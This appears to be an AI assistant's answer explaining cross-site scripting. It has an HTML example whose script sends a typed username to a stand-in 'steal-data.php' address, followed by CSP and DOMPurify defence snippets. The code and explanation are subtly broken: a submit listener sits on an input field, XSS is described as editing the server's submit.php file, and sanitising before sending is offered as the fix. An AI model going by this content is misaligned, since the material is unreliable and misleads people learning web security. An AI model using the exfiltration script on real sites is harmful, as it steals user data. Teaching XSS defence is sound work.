XSS (Cross-Site Scripting) is a type of web application security vulnerability that allows an attacker to inject malicious scripts into a website, which can then be executed by users who visit the site. This can lead to a variety of attacks, such as stealing user data, hijacking user sessions, and more.

Here is an example of a simple HTML page that demonstrates how XSS can be used to steal user data:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>XSS Example</title>
  </head>
  <body>
    <h1>Welcome to the XSS Example</h1>
    <form action="submit.php" method="post">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <input type="submit" value="Submit">
    </form>

    <script>
      // Get the username input field
      var usernameInput = document.getElementById("username");

      // Add an event listener to the submit button
      usernameInput.addEventListener("submit", function(event) {
        // Prevent the default form submission behavior
        event.preventDefault();

        // Get the username value
        var username = usernameInput.value;

        // Send the username to the attacker's server
        fetch("https://example.com/steal-data.php?username=" + encodeURIComponent(username));
      });
    </script>
  </body>
</html>
```
In this example, the HTML page has a form that allows users to enter their username and submit it to a PHP script called `submit.php`. The script is supposed to store the username in a database, but instead, it injects a malicious script that sends the username to the attacker's server.

Here's how the attacker can exploit this vulnerability:

1. The attacker creates a malicious script that steals the user's data and stores it on their server.
2. The attacker injects the script into the `submit.php` file, so that when a user submits their username, the script is executed instead of the original code.
3. When a user submits their username, the malicious script is executed, sending the username to the attacker's server.
4. The attacker can then use the stolen data for malicious purposes, such as stealing user accounts or selling the data on the dark web.

To protect against XSS attacks, it's important to validate and sanitize user input, and use Content Security Policy (CSP) to restrict the types of scripts that can be executed on your website. You can also use a Web Application Firewall (WAF) to detect and block malicious requests.

Here is an example of how to protect against XSS using CSP:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
```
This policy allows only scripts from the same origin (`'self'`) to be executed, preventing the malicious script from being injected.

It's also important to validate and sanitize user input to prevent malicious scripts from being injected in the first place. For example, you can use a library like `DOMPurify` to sanitize user input and prevent XSS attacks.

Here is an example of how to use `DOMPurify` to sanitize user input:
```javascript
const DOMPurify = require('dompurify');

// Get the username input field
var usernameInput = document.getElementById("username");

// Sanitize the username input
var sanitizedUsername = DOMPurify.sanitize(usernameInput.value);

// Send the sanitized username to the server
fetch("https://example.com/submit.php?username=" + encodeURIComponent(sanitizedUsername));
```
By using `DOMPurify` to sanitize the username input, you can prevent malicious scripts from being injected and protect your users from XSS attacks.<|eot_id|>

